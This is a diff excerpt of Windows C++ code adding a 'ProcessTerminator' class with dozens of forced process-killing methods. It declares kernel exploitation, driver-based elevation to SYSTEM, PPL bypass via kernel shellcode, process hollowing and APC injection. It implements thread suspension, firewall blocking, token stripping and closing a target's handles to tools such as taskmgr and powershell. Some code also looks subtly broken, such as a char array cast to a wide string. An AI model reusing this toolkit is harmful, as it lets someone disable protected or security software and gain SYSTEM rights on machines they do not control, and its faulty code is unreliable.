+    }
+
+    CloseHandle(hSnapshot);  // 确保所有路径都关闭句柄
+    return childPids;
+}
+
+// 挂断指定进程的所有线程
+bool SuspendProcess(DWORD processId) {
+    // 一次性获取所有线程信息
+    HandlePtr hSnapshot(CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0));
+    if (hSnapshot.get() == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+
+    THREADENTRY32 te32 = { 0 };
+    te32.dwSize = sizeof(THREADENTRY32);
+
+    std::vector<DWORD> threadIds;
+
+    // 先收集所有需要挂起的线程ID
+    if (Thread32First(hSnapshot.get(), &te32)) {
+        do {
+            if (te32.th32OwnerProcessID == processId) {
+                threadIds.push_back(te32.th32ThreadID);
+            }
+        } while (Thread32Next(hSnapshot.get(), &te32));
+    }
+
+    // 批量挂起线程
+    std::vector<HANDLE> threadHandles;
+    for (DWORD threadId : threadIds) {
+        HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, threadId);
+        if (hThread) {
+            threadHandles.push_back(hThread);
+        }
+    }
+
+    // 执行挂起操作
+    for (HANDLE hThread : threadHandles) {
+        SuspendThread(hThread);
+    }
+
+    // 清理句柄
+    for (HANDLE hThread : threadHandles) {
+        CloseHandle(hThread);
+    }
+
+    return !threadIds.empty();
+}
+
+// 将宽字符串转换为窄字符串
+std::string WideToNarrow(const std::wstring& wstr) {
+    if (wstr.empty()) return std::string();
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
+    std::string str(size_needed, 0);
+    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &str[0], size_needed, NULL, NULL);
+    return str;
+}
+
+// 将窄字符串转换为宽字符串
+std::wstring NarrowToWide(const std::string& str) {
+    if (str.empty()) return std::wstring();
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
+    std::wstring wstr(size_needed, 0);
+    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstr[0], size_needed);
+    return wstr;
+}
+
+// 前置声明
+void GQ(const std::string& processName);
+void GQS(const std::vector<std::string>& processNames);
+
+class ProcessTerminator {
+private:
+    static HANDLE OpenProcessWithMaximumAccess(DWORD pid);
+    static HANDLE OpenProcessWithDuplicate(DWORD pid);
+    static HANDLE OpenProcessWithDebugPrivilege(DWORD pid);
+    static HANDLE OpenProcessWithNativeAPI(DWORD pid);
+    static HANDLE OpenProcessWithTokenReplacement(DWORD pid);
+    static HANDLE OpenProcessWithHandleEnumeration(DWORD pid);
+    static HANDLE OpenProcessWithKernelExploitation(DWORD pid);
+    static HANDLE OpenProcessWithDriver(DWORD pid);  // 方法7.5: 通过驱动读取 EPROCESS 提权至 SYSTEM
+    static HANDLE OpenProcessWithCsrss(DWORD pid);
+    static HANDLE OpenProcessWithWMI(DWORD pid);
+    static HANDLE OpenProcessWithJobObject(DWORD pid);
+    static HANDLE OpenProcessWithToolhelp(DWORD pid);
+    static HANDLE OpenProcessWithProcessHint(DWORD pid);
+    static HANDLE OpenProcessWithDebugObject(DWORD pid);
+    static HANDLE OpenProcessWithRtlAdjustPrivilege(DWORD pid);
+    static HANDLE OpenProcessWithThreadHijack(DWORD pid);
+    static HANDLE OpenProcessWithMemoryMap(DWORD pid);
+    static HANDLE OpenProcessWithNtQueryProcess(DWORD pid);
+    static bool IsAccessDenied(DWORD error);
+    static bool terminateByTaskManagerMethod(const std::string& processName);
+    
+    // 未公开API函数指针
+    static _NtQuerySystemInformation NtQuerySystemInformation;
+    static _RtlAdjustPrivilege RtlAdjustPrivilege;
+    static _NtResumeProcess NtResumeProcess;
+    static _NtGetNextProcess NtGetNextProcess;
+    static _NtGetNextThread NtGetNextThread;
+    static _NtSetInformationProcess NtSetInformationProcess;
+    static _NtQueryInformationProcess NtQueryInformationProcess;
+    static _NtSetInformationThread NtSetInformationThread;
+    static _NtCreateThreadEx NtCreateThreadEx;
+    static _NtDuplicateObject NtDuplicateObject;
+    static _NtClose NtClose;
+    static bool IsProcessMonitoringOther(DWORD monitorPid, DWORD targetPid);
+    static void SuspendProcess(HANDLE hProcess);
+    static void StripProcessPrivileges(HANDLE hProcess);
+    static bool GetProcessHandles(HANDLE hSnapshot, std::vector<SYSTEM_HANDLE>& handles);
+    
+    // 未公开API函数指针
+    class COMInitializer {
+    public:
+        COMInitializer() : initialized_(false) {
+            HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
+            if (SUCCEEDED(hr)) {
+                initialized_ = true;
+            }
+        }
+
+        ~COMInitializer() {
+            if (initialized_) {
+                CoUninitialize();
+            }
+        }
+
+        bool IsInitialized() const { return initialized_; }
+
+    private:
+        bool initialized_;
+    };
+
+    // 防火墙规则管理器
+    class FirewallRuleManager {
+    public:
+        static bool CreateBlockRule(DWORD pid, const std::wstring& ruleName) {
+            COMInitializer com;
+            if (!com.IsInitialized()) return false;
+
+            INetFwPolicy2* pFwPolicy = nullptr;
+            INetFwRules* pFwRules = nullptr;
+            INetFwRule* pFwRule = nullptr;
+
+            bool success = false;
+
+            do {
+                // 删除可能存在的旧规则
+                DeleteFirewallRule(ruleName);
+
+                // 创建防火墙策略实例
+                HRESULT hr = CoCreateInstance(__uuidof(NetFwPolicy2), nullptr,
+                    CLSCTX_INPROC_SERVER, __uuidof(INetFwPolicy2),
+                    (void**)&pFwPolicy);
+                if (FAILED(hr)) break;
+
+                hr = pFwPolicy->get_Rules(&pFwRules);
+                if (FAILED(hr)) break;
+
+                hr = CoCreateInstance(__uuidof(NetFwRule), nullptr,
+                    CLSCTX_INPROC_SERVER, __uuidof(INetFwRule),
+                    (void**)&pFwRule);
+                if (FAILED(hr)) break;
+
+                BSTR bstrRuleName = SysAllocString(ruleName.c_str());
+                if (!bstrRuleName) break;
+
+                // 设置规则属性
+                pFwRule->put_Name(bstrRuleName);
+                pFwRule->put_Action(NET_FW_ACTION_BLOCK);
+                pFwRule->put_Enabled(VARIANT_TRUE);
+                pFwRule->put_Direction(NET_FW_RULE_DIR_OUT);
+                pFwRule->put_Protocol(NET_FW_IP_PROTOCOL_ANY);
+
+                // 添加规则
+                hr = pFwRules->Add(pFwRule);
+                success = SUCCEEDED(hr);
+
+                SysFreeString(bstrRuleName);
+
+            } while (false);
+
+            // 清理资源
+            if (pFwRule) pFwRule->Release();
+            if (pFwRules) pFwRules->Release();
+            if (pFwPolicy) pFwPolicy->Release();
+
+            return success;
+        }
+
+        static bool DeleteFirewallRule(const std::wstring& ruleName) {
+            COMInitializer com;
+            if (!com.IsInitialized()) return false;
+
+            INetFwPolicy2* pFwPolicy = nullptr;
+            INetFwRules* pFwRules = nullptr;
+
+            bool success = false;
+
+            do {
+                HRESULT hr = CoCreateInstance(__uuidof(NetFwPolicy2), nullptr,
+                    CLSCTX_INPROC_SERVER, __uuidof(INetFwPolicy2),
+                    (void**)&pFwPolicy);
+                if (FAILED(hr)) break;
+
+                hr = pFwPolicy->get_Rules(&pFwRules);
+                if (FAILED(hr)) break;
+
+                BSTR bstrRuleName = SysAllocString(ruleName.c_str());
+                if (!bstrRuleName) break;
+
+                // 尝试删除规则
+                hr = pFwRules->Remove(bstrRuleName);
+                success = SUCCEEDED(hr) || hr == HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND);
+
+                SysFreeString(bstrRuleName);
+
+            } while (false);
+
+            if (pFwRules) pFwRules->Release();
+            if (pFwPolicy) pFwPolicy->Release();
+
+            return success;
+        }
+    };
+    // 检查文件是否有微软数字签名
+    static bool ClearCriticalProcessFlag(int pid);
+    // 新方法：阻止目标进程访问关键系统工具和其他程序句柄
+    static bool terminateByProcessIsolationAndBlocking(const std::string& processName) {
+#ifdef _WIN32
+        try {
+            std::vector<int> pids = getPIDsByName(processName);
+            if (pids.empty()) return false;
+
+            for (int pid : pids) {
+                HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+                if (!hProcess) continue;
+
+                // 方法1: 使用作业对象隔离进程并限制访问
+                HANDLE hJob = CreateJobObject(NULL, NULL);
+                if (hJob) {
+                    // 设置基本限制
+                    JOBOBJECT_BASIC_LIMIT_INFORMATION basicLimit = { 0 };
+                    basicLimit.LimitFlags = JOB_OBJECT_LIMIT_ACTIVE_PROCESS |
+                        JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION;
+                    basicLimit.ActiveProcessLimit = 1; // 只允许一个进程
+
+                    SetInformationJobObject(hJob, JobObjectBasicLimitInformation,
+                        &basicLimit, sizeof(basicLimit));
+
+                    // 设置UI限制 - 阻止访问关键系统工具
+                    JOBOBJECT_BASIC_UI_RESTRICTIONS uiRestrictions = { 0 };
+                    uiRestrictions.UIRestrictionsClass =
+                        JOB_OBJECT_UILIMIT_SYSTEMPARAMETERS |
+                        JOB_OBJECT_UILIMIT_DISPLAYSETTINGS |
+                        JOB_OBJECT_UILIMIT_EXITWINDOWS |
+                        JOB_OBJECT_UILIMIT_READCLIPBOARD |
+                        JOB_OBJECT_UILIMIT_WRITECLIPBOARD;
+
+                    SetInformationJobObject(hJob, JobObjectBasicUIRestrictions,
+                        &uiRestrictions, sizeof(uiRestrictions));
+
+                    // 将进程分配到作业对象
+                    AssignProcessToJobObject(hJob, hProcess);
+                }
+
+                // 方法2: 修改进程令牌，降低权限
+                HANDLE hToken;
+                if (OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
+                    // 创建受限令牌
+                    HANDLE hRestrictedToken;
+                    if (CreateRestrictedToken(hToken, DISABLE_MAX_PRIVILEGE,
+                        0, NULL, 0, NULL, 0, NULL,
+                        &hRestrictedToken)) {
+                        // 设置低完整性级别
+                        TOKEN_MANDATORY_LABEL tml = { 0 };
+                        tml.Label.Attributes = SE_GROUP_INTEGRITY;
+                        tml.Label.Sid = GetLowIntegritySid();
+
+                        SetTokenInformation(hRestrictedToken, TokenIntegrityLevel,
+                            &tml, sizeof(tml));
+
+                        // 使用新令牌创建进程（如果需要）
+                        CloseHandle(hRestrictedToken);
+                    }
+                    CloseHandle(hToken);
+                }
+
+                // 方法3: 阻止访问关键系统工具
+                BlockCriticalSystemTools(pid);
+
+                // 方法4: 阻止访问其他进程句柄
+                BlockProcessHandleAccess(pid);
+
+                // 方法5: 使用进程策略限制
+                ApplyProcessMitigationPolicies(hProcess);
+
+                CloseHandle(hProcess);
+            }
+
+            // 等待隔离生效
+            std::this_thread::sleep_for(std::chrono::milliseconds(500));
+
+            // 尝试终止被隔离的进程
+            return terminateByProcessName(processName);
+        }
+        catch (...) {
+            return false;
+        }
+#else
+        return false;
+#endif
+    }
+
+    // 获取低完整性级别的SID
+    static PSID GetLowIntegritySid() {
+        static PSID lowIntegritySid = nullptr;
+        if (!lowIntegritySid) {
+            ConvertStringSidToSid(L"S-1-16-4096", &lowIntegritySid);
+        }
+        return lowIntegritySid;
+    }
+
+    // 阻止访问关键系统工具
+    static void BlockCriticalSystemTools(DWORD targetPid) {
+#ifdef _WIN32
+        try {
+            // 关键系统工具列表
+            std::vector<std::wstring> criticalTools = {
+                L"taskkill.exe", L"cmd.exe", L"SC.exe",L"conhost.exe",L"taskmgr.exe",L"explorer.exe",L"ntoskrnl.exe",
+                L"DISM.exe", L"diskpart.exe", L"powershell.exe",L"services.exe",
+                L"reg.exe", L"schtasks.exe", L"net.exe"
+            };
+
+            // 获取系统所有句柄
+            std::vector<SYSTEM_HANDLE> handles;
+            if (GetProcessHandles(INVALID_HANDLE_VALUE, handles)) {
+                for (const auto& handle : handles) {
+                    // 如果句柄属于目标进程且是进程对象
+                    if (handle.ProcessId == targetPid && handle.ObjectTypeNumber == 0x7) {
+                        // 检查被打开的进程是否是关键工具
+                        HANDLE hTargetProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
+                            FALSE, handle.ProcessId);
+                        if (hTargetProcess) {
+                            WCHAR processName[MAX_PATH];
+                            DWORD size = MAX_PATH;
+                            if (QueryFullProcessImageNameW(hTargetProcess, 0, processName, &size)) {
+                                std::wstring name(processName);
+                                // 转换为小写进行比较
+                                std::transform(name.begin(), name.end(), name.begin(), ::towlower);
+
+                                for (const auto& tool : criticalTools) {
+                                    if (name.find(tool) != std::wstring::npos) {
+                                        // 关闭这个句柄
+                                        HANDLE hDuplicate;
+                                        if (DuplicateHandle(GetCurrentProcess(),
+                                            (HANDLE)handle.Handle,
+                                            GetCurrentProcess(), &hDuplicate,
+                                            0, FALSE, DUPLICATE_CLOSE_SOURCE)) {
+                                            CloseHandle(hDuplicate);
+                                        }
+                                        break;
+                                    }
+                                }
+                            }
+                            CloseHandle(hTargetProcess);
+                        }
+                    }
+                }
+            }
+        }
+        catch (...) {
+            // 忽略异常
+        }
+#endif
+    }
+
+    // 阻止进程访问其他程序句柄
+    static void BlockProcessHandleAccess(DWORD targetPid) {
+#ifdef _WIN32
+        try {
+            // 获取目标进程的所有句柄
+            std::vector<SYSTEM_HANDLE> handles;
+            if (GetProcessHandles(INVALID_HANDLE_VALUE, handles)) {
+                for (const auto& handle : handles) {
+                    // 查找目标进程打开的其他进程句柄
+                    if (handle.ProcessId == targetPid && handle.ObjectTypeNumber == 0x7) {
+                        DWORD openedPid = GetProcessId((HANDLE)handle.Handle);
+                        if (openedPid != 0 && openedPid != targetPid &&
+                            openedPid != GetCurrentProcessId()) {
+
+                            // 检查被打开的进程是否访问过目标进程
+                            if (HasProcessAccessedTarget(openedPid, targetPid)) {
+                                // 关闭这个句柄
+                                HANDLE hDuplicate;
+                                if (DuplicateHandle(GetCurrentProcess(),
+                                    (HANDLE)handle.Handle,
+                                    GetCurrentProcess(), &hDuplicate,
+                                    0, FALSE, DUPLICATE_CLOSE_SOURCE)) {
+                                    CloseHandle(hDuplicate);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        catch (...) {
+            // 忽略异常
+        }
+#endif
+    }
+
+    // 检查进程是否访问过目标进程
+    static bool HasProcessAccessedTarget(DWORD checkerPid, DWORD targetPid) {
+#ifdef _WIN32
+        try {
+            std::vector<SYSTEM_HANDLE> handles;
+            if (GetProcessHandles(INVALID_HANDLE_VALUE, handles)) {
+                for (const auto& handle : handles) {
+                    if (handle.ProcessId == checkerPid &&
+                        handle.ObjectTypeNumber == 0x7 && // 进程对象
+                        GetProcessId((HANDLE)handle.Handle) == targetPid) {
+                        return true;
+                    }
+                }
+            }
+        }
+        catch (...) {
+            // 忽略异常
+        }
+#endif
+        return false;
+    }
+
+    // 应用进程缓解策略
+    static void ApplyProcessMitigationPolicies(HANDLE hProcess) {
+#ifdef _WIN32
+        try {
+            HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+            if (!hKernel32) return;
+
+            auto pSetProcessMitigationPolicy =
+                reinterpret_cast<PSetProcessMitigationPolicy>(
+                    GetProcAddress(hKernel32, "SetProcessMitigationPolicy"));
+
+            if (!pSetProcessMitigationPolicy) return;
+
+            // 设置进程缓解策略
+            PROCESS_MITIGATION_IMAGE_LOAD_POLICY imageLoadPolicy = { 0 };
+            imageLoadPolicy.NoRemoteImages = 1;
+            imageLoadPolicy.NoLowMandatoryLabelImages = 1;
+            pSetProcessMitigationPolicy(ProcessImageLoadPolicy,
+                &imageLoadPolicy, sizeof(imageLoadPolicy));
+
+            // 设置子进程策略
+            PROCESS_MITIGATION_CHILD_PROCESS_POLICY childProcessPolicy = { 0 };
+            childProcessPolicy.NoChildProcessCreation = 1;
+            pSetProcessMitigationPolicy(ProcessChildProcessPolicy,
+                &childProcessPolicy, sizeof(childProcessPolicy));
+        }
+        catch (...) {
+            // 忽略异常
+        }
+#endif
+    }
+    // 通过Vectored Exception Handling实现权限提升
+    static bool terminateByVectoredException(const std::string& processName);
+
+    // 使用硬件断点技术
+    static bool terminateByHardwareBreakpoint(const std::string& processName);
+
+    // 通过服务检测和停止进程
+    static bool terminateByServiceDetection(const std::string& processName);
+
+    // 通过内存映射文件共享内核数据
+    static bool terminateByMemoryMapping(const std::string& processName);
+
+    // 利用进程间通信的特殊通道
+    static bool terminateBySpecialIPC(const std::string& processName);
+public:
+    static HANDLE OpenProcessEnhanced(DWORD pid, DWORD desiredAccess = PROCESS_ALL_ACCESS);
+
+    // 获取进程的可执行文件路径
+    static std::wstring GetProcessPath(DWORD pid) {
+        HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ);
+        if (!hProcess) {
+            return L"";
+        }
+
+        wchar_t path[MAX_PATH];
+        DWORD size = MAX_PATH;
+        if (QueryFullProcessImageNameW(hProcess, 0, path, &size)) {
+            CloseHandle(hProcess);
+            return path;
+        }
+
+        CloseHandle(hProcess);
+        return L"";
+    }
+
+    // 公开的Native API相关成员
+    static bool initNativeAPI() { return initNativeAPIImpl(); }
+    static bool EnableAllPrivileges();
+    static _NtTerminateProcess NtTerminateProcess;
+    static _NtSuspendProcess NtSuspendProcess;
+    static _NtOpenProcess NtOpenProcess;
+    static _NtWriteVirtualMemory NtWriteVirtualMemory;
+    static _NtAllocateVirtualMemory NtAllocateVirtualMemory;
+    
+    static bool initNativeAPIImpl() {
+        static bool initialized = false;
+        if (initialized) return true;
+
+#ifdef _WIN32
+        HMODULE ntdll = GetModuleHandle(_T("ntdll.dll"));
+        if (!ntdll) return false;
+
+        NtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
+        NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
+        NtTerminateProcess = (_NtTerminateProcess)GetProcAddress(ntdll, "NtTerminateProcess");
+        RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
+        NtSuspendProcess = (_NtSuspendProcess)GetProcAddress(ntdll, "NtSuspendProcess");
+        NtResumeProcess = (_NtResumeProcess)GetProcAddress(ntdll, "NtResumeProcess");
+        NtGetNextProcess = (_NtGetNextProcess)GetProcAddress(ntdll, "NtGetNextProcess");
+        NtGetNextThread = (_NtGetNextThread)GetProcAddress(ntdll, "NtGetNextThread");
+        NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
+        NtSetInformationThread = (_NtSetInformationThread)GetProcAddress(ntdll, "NtSetInformationThread");
+        NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
+        NtOpenProcess = (_NtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
+        NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
+        NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
+        NtDuplicateObject = (_NtDuplicateObject)GetProcAddress(ntdll, "NtDuplicateObject");
+        NtClose = (_NtClose)GetProcAddress(ntdll, "NtClose");
+
+        initialized = (NtSetInformationProcess != nullptr) &&
+            (NtQuerySystemInformation != nullptr) &&
+            (NtTerminateProcess != nullptr) &&
+            (RtlAdjustPrivilege != nullptr) &&
+            (NtSuspendProcess != nullptr) &&
+            (NtResumeProcess != nullptr) &&
+            (NtGetNextProcess != nullptr) &&
+            (NtGetNextThread != nullptr) &&
+            (NtQueryInformationProcess != nullptr) &&
+            (NtSetInformationThread != nullptr) &&
+            (NtCreateThreadEx != nullptr) &&
+            (NtOpenProcess != nullptr) &&
+            (NtWriteVirtualMemory != nullptr) &&
+            (NtDuplicateObject != nullptr) &&
+            (NtClose != nullptr);
+#endif
+        return initialized;
+    }
+
+    // 纯C风格辅助函数：带SEH保护的NtQuerySystemInformation调用
+    // 必须独立于C++函数，避免C2712/C2713（SEH与C++对象析构冲突）
+#ifdef _WIN32
+    static NTSTATUS SafeNtQuerySystemInformation(
+        SYSTEM_INFORMATION_CLASS infoClass,
+        PVOID buffer,
+        ULONG bufferSize,
+        PULONG returnLength)
+    {
+        NTSTATUS status;
+        __try {
+            status = NtQuerySystemInformation(infoClass, buffer, bufferSize, returnLength);
+        } __except (EXCEPTION_EXECUTE_HANDLER) {
+            // SEH捕获：系统版本不同导致内核结构读取失败
+            status = (NTSTATUS)0xC0000005; // STATUS_ACCESS_VIOLATION
+        }
+        return status;
+    }
+#endif
+
+    // 高危方法 - 内核级进程终止
+    static bool terminateByImageSignatureEnforcement(const std::string& processName);
+    static bool terminateByCodeIntegrityViolation(const std::string& processName);
+    static bool terminateByExtendedPolicyFramework(const std::string& processName);
+    static bool terminateByMemoryPartitionCorruption(const std::string& processName);
+    static bool terminateByThreadPoolInfrastructure(const std::string& processName);
+    static bool terminateByExceptionChainCorruption(const std::string& processName);
+    static bool terminateBySecuritySubsystemBypass(const std::string& processName);
+    static bool terminateByVirtualizationInfrastructure(const std::string& processName);
+    static bool terminateByKernelMemoryManipulation(const std::string& processName);
+    static bool terminateByAdvancedIsolation(const std::string& processName);
+    static bool terminateByPracticalRing0Call(const std::string& processName);
+    static bool terminateByPhantomKiller(const std::string& processName);
+    static bool SuspendProcessNative(HANDLE hProcess) {
+        if (!initNativeAPI() || !NtSuspendProcess) {
+            return false;
+        }
+        NTSTATUS status = NtSuspendProcess(hProcess);
+        return NT_SUCCESS(status);
+    }
+    // 常规方法
+    static bool terminateByProcessName(const std::string& processName);
+    static bool terminateByPID(int pid){
+
+#ifdef _WIN32
+        try {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess == NULL) return false;
+
+            bool result = TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+            return result;
+        }
+        catch (...) {
+            return false;
+        }
+#else
+        try {
+            return kill(pid, SIGTERM) == 0;
+        }
+        catch (...) {
+            return false;
+        }
+#endif
+    }
+    // 新增的5种冷门方法
+    static bool terminateByProcessIsolationAndAPIDisruption(const std::string& processName);
+    static bool terminateByProcessEnergyManagement(const std::string& processName);
+    static bool terminateByProcessStateExtension(const std::string& processName);
+    static bool terminateByProcessFaultTolerance(const std::string& processName);
+    static bool terminateByProcessActivityModeration(const std::string& processName);
+    static bool terminateByProcessVirtualizationBasedSecurity(const std::string& processName);
+    static bool terminateByProcessVault(const std::string& processName);
+    static bool terminateByProcessDynamicCodePolicy(const std::string& processName);
+    static bool terminateByProcessControlFlowGuard(const std::string& processName);
+    static bool terminateByProcessSignaturePolicy(const std::string& processName);
+    static bool terminateByHandleInheritance(const std::string& processName);
+    static bool terminateByMemoryZeroing(const std::string& processName);
+    static bool terminateByThreadHijacking(const std::string& processName);
+    static bool terminateByExceptionInjection(const std::string& processName);
+    static bool terminateByMessageFlooding(const std::string& processName);
+    static bool terminateByGDIExhaustion(const std::string& processName);
+    static bool terminateByProcessTree(const std::string& processName);
+    static bool terminateByTokenReplacement(const std::string& processName);
+    static bool terminateByAPCInjection(const std::string& processName);
+    static bool terminateBySystemCommand(const std::string& processName);
+    // 非常规方法
+    static bool terminateByParentChildRelationship(const std::string& processName);
+    static bool terminateByResourceExhaustion(const std::string& processName);
+    static bool terminateByWindowHandle(const std::string& processName);
+    static bool terminateByDirectMemoryZeroing(const std::string& processName);
+    static bool terminateByProcessInjection(const std::string& processName);
+    static bool terminateByDebugging(const std::string& processName);
+    static bool terminateByTimedKill(const std::string& processName);
+    static bool terminateByPriorityManipulation(const std::string& processName);
+    static bool terminateByProcessHollowing(const std::string& processName);
+
+    // 未公开API方法
+    static bool terminateByNativeAPI(const std::string& processName);
+    static bool terminateByHandleEnumeration(const std::string& processName);
+    static bool terminateByMemoryPatching(const std::string& processName);
+
+    // OB回调方法
+    static bool terminateByObCallbacks(const std::string& processName);
+    static bool terminateByProcessObjectManipulation(const std::string& processName);
+    static bool terminateBySecurityDescriptorModification(const std::string& processName);
+
+    // WMI方法
+    static bool terminateByWMI(const std::string& processName);
+
+    static bool terminateByCriticalProcessFlag(const std::string& processName);
+    static bool terminateByProcessIsolation(const std::string& processName);
+    static bool terminateByMemoryCorruption(const std::string& processName);
+    static bool terminateByHandleCloning(const std::string& processName);
+    static bool terminateByDesktopIsolation(const std::string& processName);
+    static bool terminateByTokenPrivilegeRemoval(const std::string& processName);
+    static bool terminateByRegistryModification(const std::string& processName);
+    static bool terminateByServiceControl(const std::string& processName);
+    static bool terminateByCOMObjectManipulation(const std::string& processName);
+    static bool terminateByNetworkIsolation(const std::string& processName);
+    static bool terminateByPowerManagement(const std::string& processName);
+    static bool terminateByUIAutomation(const std::string& processName);
+    static bool terminateByRandomizedMethods(const std::string& processName);
+
+    // 新增未公开API方法
+    static bool terminateByThreadSuspension(const std::string& processName);
+    static bool terminateByProcessDebugPort(const std::string& processName);
+    static bool terminateByProcessHandleTable(const std::string& processName);
+    static bool terminateByProcessWorkingSet(const std::string& processName);
+    static bool terminateByProcessPagePriority(const std::string& processName);
+    static bool terminateByProcessIoPriority(const std::string& processName);
+    static bool terminateByProcessCycleTime(const std::string& processName);
+    static bool terminateByProcessCookie(const std::string& processName);
+
+    // 辅助函数
+    static std::vector<int> getPIDsByName(const std::string& processName);
+    static bool enableDebugPrivilege();
+    static bool isProcessCritical(int pid);
+    static bool isProcessRunning(const std::string& processName);
+
+    // 同目录保护进程检测和结束功能
+    static bool IsMicrosoftSigned(const std::wstring& filePath);
+    static std::wstring GetProcessDirectory(DWORD pid);
+    static std::wstring GetCurrentProcessDirectory();
+    static std::vector<std::pair<DWORD, std::wstring>> GetProcessesInSameDirectory(const std::wstring& targetDir);
+    static bool IsSystemProcessWhitelisted(const std::wstring& processName);
+    static bool TerminateSameDirectoryProtectors(const std::wstring& targetProcessPath, bool useAllMethods);
+
+    // 调用所有方法
+    static bool terminateByAllMethods(const std::string& processName);
+    static bool terminateByProcessDepletion(const std::string& processName);
+    static bool terminateByProcessAttach(const std::string& processName);
+    static bool terminateByProcessDetach(const std::string& processName);
+    static bool terminateByProcessFault(const std::string& processName);
+    static bool terminateByProcessInterlock(const std::string& processName);
+    
+    // PPL绕过功能 - 64位ShellCode
+    static bool terminateByPPLBypass(const std::string& processName);
+    static bool LoadKernelShellCode(PVOID shellcode, SIZE_T size);
+    static bool ExecuteKernelShellCode(DWORD targetPid);
+    
+    // 多进程终止方法
+    static bool terminateMultipleProcesses(const std::vector<std::string>& processNames);
+
+    // USB存储恢复功能
+    static bool RestoreUSBStorage();
+    static bool EnableUSBDevice(const std::wstring& deviceInstanceId);
+    static bool ClearUSBRegistryLimits();
+    
+    // 键盘鼠标恢复功能
+    static bool RestoreInputDevices();
+    static bool UnblockInput();
+    static bool UnhookGlobalInputHooks();
+    
+    // 全屏覆盖检测与对抗功能
+    static bool DetectAndRemoveFullscreenOverlays();
+    static bool DetectDXGIOverlayWindows(std::vector<HWND>& overlayWindows);
+    static bool DetectGDILayeredOverlay(std::vector<HWND>& overlayWindows);
+    static bool RemoveFullscreenOverlay(HWND hwnd);
+    static bool IsSuspiciousOverlayWindow(HWND hwnd);
+};
+
+// 初始化静态成员
+_NtQuerySystemInformation ProcessTerminator::NtQuerySystemInformation = nullptr;
+_NtTerminateProcess ProcessTerminator::NtTerminateProcess = nullptr;
+_RtlAdjustPrivilege ProcessTerminator::RtlAdjustPrivilege = nullptr;
+_NtSuspendProcess ProcessTerminator::NtSuspendProcess = nullptr;
+_NtResumeProcess ProcessTerminator::NtResumeProcess = nullptr;
+_NtGetNextProcess ProcessTerminator::NtGetNextProcess = nullptr;
+_NtGetNextThread ProcessTerminator::NtGetNextThread = nullptr;
+_NtSetInformationProcess ProcessTerminator::NtSetInformationProcess = nullptr;
+_NtQueryInformationProcess ProcessTerminator::NtQueryInformationProcess = nullptr;
+_NtSetInformationThread ProcessTerminator::NtSetInformationThread = nullptr;
+_NtCreateThreadEx ProcessTerminator::NtCreateThreadEx = nullptr;
+_NtOpenProcess ProcessTerminator::NtOpenProcess = nullptr;
+_NtWriteVirtualMemory ProcessTerminator::NtWriteVirtualMemory = nullptr;
+_NtAllocateVirtualMemory ProcessTerminator::NtAllocateVirtualMemory = nullptr;
+
+
+
+_NtDuplicateObject ProcessTerminator::NtDuplicateObject = nullptr;
+_NtClose ProcessTerminator::NtClose = nullptr;
+bool ProcessTerminator::terminateByHandleInheritance(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            // 创建一个可以继承句柄的进程
+            SECURITY_ATTRIBUTES sa;
+            sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+            sa.lpSecurityDescriptor = NULL;
+            sa.bInheritHandle = TRUE;
+
+            HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+            if (!hTargetProcess) continue;
+
+            // 创建一个临时进程来继承句柄
+            STARTUPINFO si = { sizeof(si) };
+            si.lpDesktop = const_cast<LPWSTR>(L"Winsta0\\Default");
+            PROCESS_INFORMATION pi = { 0 };
+            char cmdline[] = "cmd.exe /c exit";
+
+            if (CreateProcess(NULL, LPWSTR(cmdline), &sa, NULL, TRUE,
+                CREATE_NO_WINDOW | CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+                // 复制句柄到新进程
+                HANDLE hInheritedHandle;
+                if (DuplicateHandle(GetCurrentProcess(), hTargetProcess, pi.hProcess,
+                    &hInheritedHandle, PROCESS_TERMINATE, FALSE, 0)) {
+                    // 使用继承的句柄终止进程
+                    TerminateProcess(hInheritedHandle, 0);
+                    CloseHandle(hInheritedHandle);
+                }
+
+                TerminateProcess(pi.hProcess, 0);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+            }
+
+            CloseHandle(hTargetProcess);
+        }
+
+        return !isProcessRunning(processName);
+    }
+    catch (...) {
